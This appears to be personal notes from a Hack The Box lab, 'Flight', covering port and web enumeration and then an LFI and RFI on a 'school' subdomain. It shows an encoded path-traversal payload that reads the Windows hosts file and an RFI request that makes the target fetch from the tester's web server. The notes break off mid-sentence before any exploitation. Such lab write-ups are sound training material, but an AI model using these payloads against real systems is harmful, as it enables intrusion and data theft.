# Host file setup
```python
sudo nxc smb 10.129.228.120 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```
SMB signing enabled

Null auth enabled

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT g0.flight.htb -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 15:59 +0100
Nmap scan report for g0.flight.htb (10.129.228.120)
Host is up (0.014s latency).
rDNS record for 10.129.228.120: G0.flight.htb
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49695/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.70 seconds
```

## Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -A --min-rate=2000 -sT g0.flight.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 16:01 +0100
Nmap scan report for g0.flight.htb (10.129.228.120)
Host is up (0.014s latency).
rDNS record for 10.129.228.120: G0.flight.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-31 22:01:27Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Web server is running apache

DC is running at +6h

# HTTP (80)
## Nuclei 
```python
nuclei -u http://flight.htb/                                                                    

[http-trace:trace-request] [http] [info] http://flight.htb/
[http-trace:options-request] [http] [info] http://flight.htb/
[waf-detect:apachegeneric] [http] [info] http://flight.htb/
[ldap-metadata] [javascript] [info] flight.htb:389 ["DomainControllerFunctionality: 7","BaseDN: dc=389","DnsHostName: g0.flight.htb","DefaultNamingContext: DC=flight,DC=htb","DomainFunctionality: 7","ForestFunctionality: 7"]
[smb2-capabilities] [javascript] [info] flight.htb:445 ["["DFSSupport","LargeMTU","Leasing"]"]
[smb-version-detect:smb-version] [javascript] [info] flight.htb:445 ["SMB 2.1"]
[smb2-server-time] [javascript] [info] flight.htb:445 ["SystemTime: 2026-03-31T22:06:08.000Z ServerStartTime: 2009-04-22T19:24:48.000Z"]
[smb-enum] [javascript] [info] flight.htb:445 ["NetBIOSComputerName: G0","NetBIOSDomainName: flight","DNSComputerNamen: g0.flight.htb","DNSComputerName: g0.flight.htb","ForestName: flight.htb","OSVersion: 10.0.17763"]
[smb-enum-domains] [javascript] [info] flight.htb:445 ["DomainName: flight.htb"]
[smb-os-detect] [javascript] [info] flight.htb:445 ["Windows Server 2019, Version 1809"]
[ldap-anonymous-login-detect] [javascript] [medium] flight.htb:389
[old-copyright] [http] [info] http://flight.htb/ ["Copyright 2022"]
[http-missing-security-headers:clear-site-data] [http] [info] http://flight.htb/
[http-missing-security-headers:strict-transport-security] [http] [info] http://flight.htb/
[http-missing-security-headers:content-security-policy] [http] [info] http://flight.htb/
[http-missing-security-headers:x-content-type-options] [http] [info] http://flight.htb/
[http-missing-security-headers:referrer-policy] [http] [info] http://flight.htb/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://flight.htb/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://flight.htb/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://flight.htb/
[http-missing-security-headers:missing-content-type] [http] [info] http://flight.htb/
[http-missing-security-headers:permissions-policy] [http] [info] http://flight.htb/
[http-missing-security-headers:x-frame-options] [http] [info] http://flight.htb/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://flight.htb/
[cgi-printenv] [http] [medium] http://flight.htb/cgi-bin/printenv.pl
[options-method] [http] [info] http://flight.htb/ ["GET,POST,OPTIONS,HEAD,TRACE"]
[apache-detect] [http] [info] http://flight.htb/ ["Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1"]
[openssl-detect] [http] [info] http://flight.htb/ ["OpenSSL/1.1.1m"]
[php-detect] [http] [info] http://flight.htb/
[caa-fingerprint] [dns] [info] flight.htb
```
## Ffuf for subdomains
```python
ffuf -u http://flight.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.flight.htb' -t 50 -fs 7069

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://flight.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7069
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 15ms]
Duration: [0:00:35:: P:: Progress: [114442/114442] :: Job [1/1] :: 285 req/sec :: Duration: [0:03:27] :: Errors: 0 ::
```
Found a `school` subdomain
## Ferosbuster
```python
nothing interesting
```
## Website functionality
![[Pasted image 20260331161611.png|757]]
The website appears to be a flight planner for an airline

This form on the landing page doesnt have any functionality

No other links on the page go anywhere

## `school` subdomain
### Feroxbuster
```python
nothing interesting
```
There is a `phpmyadmin` install on here!
### Nuclei
```python
nuclei -u http://school.flight.htb/                  

[http-trace:trace-request] [http] [info] http://school.flight.htb/
[waf-detect:apachegeneric] [http] [info] http://school.flight.htb/
[ldap-metadata] [javascript] [info] school.flight.htb:389 ["DnsHostName: g0.flight.htb","DefaultNamingContext: DC=flight,DC=htb","DomainFunctionality: 7","ForestFunctionality: 7","DomainControllerFunctionality: 7","BaseDN: dc=389"]
[smb-version-detect:smb-version] [javascript] [info] school.flight.htb:445 ["SMB 2.1"]
[smb2-capabilities] [javascript] [info] school.flight.htb:445 ["["DFSSupport","LargeMTU","Leasing"]"]
[smb2-server-time] [javascript] [info] school.flight.htb:445 ["SystemTime: 2026-03-31T22:20:20.000Z ServerStartTime: 2009-04-22T19:24:48.000Z"]
[smb-enum-domains] [javascript] [info] school.flight.htb:445 ["DomainName: flight.htb"]
[smb-enum] [javascript] [info] school.flight.htb:445 ["OSVersion: 10.0.17763","NetBIOSComputerName: G0","NetBIOSDomainName: flight","DNSComputerNamen: g0.flight.htb","DNSComputerName: g0.flight.htb","ForestName: flight.htb"]
[smb-os-detect] [javascript] [info] school.flight.htb:445 ["Windows Server 2019, Version 1809"]
[ldap-anonymous-login-detect] [javascript] [medium] school.flight.htb:389
[tech-detect:php] [http] [info] http://school.flight.htb/
[http-missing-security-headers:permissions-policy] [http] [info] http://school.flight.htb/
[http-missing-security-headers:x-frame-options] [http] [info] http://school.flight.htb/
[http-missing-security-headers:x-content-type-options] [http] [info] http://school.flight.htb/
[http-missing-security-headers:referrer-policy] [http] [info] http://school.flight.htb/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://school.flight.htb/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://school.flight.htb/
[http-missing-security-headers:missing-content-type] [http] [info] http://school.flight.htb/
[http-missing-security-headers:strict-transport-security] [http] [info] http://school.flight.htb/
[http-missing-security-headers:content-security-policy] [http] [info] http://school.flight.htb/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://school.flight.htb/
[http-missing-security-headers:clear-site-data] [http] [info] http://school.flight.htb/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://school.flight.htb/
[apache-detect] [http] [info] http://school.flight.htb/ ["Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1"]
[openssl-detect] [http] [info] http://school.flight.htb/ ["OpenSSL/1.1.1m"]
[php-detect] [http] [info] http://school.flight.htb/ ["8.1.1"]
[cgi-printenv] [http] [medium] http://school.flight.htb/cgi-bin/printenv.pl
[caa-fingerprint] [dns] [info] school.flight.htb
```
### Website functionality
![[Pasted image 20260331162058.png|884]]
There is clearly some protection on this functionality when trying to get LFI

# LFI in `school` subdomain
After seeing the protections on the URL parameter i investigated further

Ill use this wordlist here to fuzz the parameter:

/usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt

```python
GET /index.php?view=%2F%2F.%2FC%3A%2FWindows%2Fsystem32%2Fdrivers%2Fetc%2Fhosts HTTP/1.1
Host: school.flight.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://school.flight.htb/index.php?view=home.html
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
After filtering the response length i found a file read vulnerability in the URL parameter bypassing any protections that are there

URL decoding the payload used i get this:
```python
//./C:/Windows/system32/drivers/etc/hosts
```
# RFI in `school` subdomain
So to test this ill setup a python webserver on my machine

```python
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```python
GET /index.php?view=http://10.10.14.90:8000/test.txt HTTP/1.1
Host: school.flight.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://school.flight.htb/index.php?view=home.html
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
Ill send this request and wait for a response on my server

```python
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.228.120 - - [31/Mar/2026 16:44:56] code 404, message File not found
10.129.228.120 - - [31/Mar/2026 16:44:56] "GET /test.txt HTTP/1.1" 404 -
```
Confirmed RFI

To exploit this i can use r